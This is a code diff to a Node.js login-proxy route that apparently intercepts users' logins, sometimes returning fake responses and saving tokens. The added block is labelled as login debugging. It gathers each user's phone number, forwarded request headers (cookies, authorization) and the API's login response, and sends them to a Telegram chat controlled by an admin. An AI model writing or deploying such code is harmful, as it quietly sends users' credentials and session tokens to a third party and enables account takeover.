@@ -1139,6 +1139,19 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       return res.status(200).json(fakeResp);
     }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+
+    if (data.adminChatId && bot) {
+      const sentHeaders = {};
+      for (const [k, v] of Object.entries(req.headers)) {
+        const kl = k.toLowerCase();
+        if (!['host','connection','content-length','transfer-encoding'].includes(kl) && !kl.startsWith('x-vercel') && !kl.startsWith('x-forwarded')) {
+          sentHeaders[k] = v;
+        }
+      }
+      const debugMsg = `🔍 LOGIN DEBUG\n📱 Phone: ${phone}\n\n📤 HEADERS SENT TO API:\n${JSON.stringify(sentHeaders, null, 2).substring(0, 1500)}\n\n📥 API RESPONSE:\n${JSON.stringify(jsonResp, null, 2).substring(0, 1000)}`;
+      bot.sendMessage(data.adminChatId, debugMsg).catch(() => {});
+    }
+
     const userId = await extractUserId(req, jsonResp);
     if (userId) {
       saveTokenUserId(req, userId);
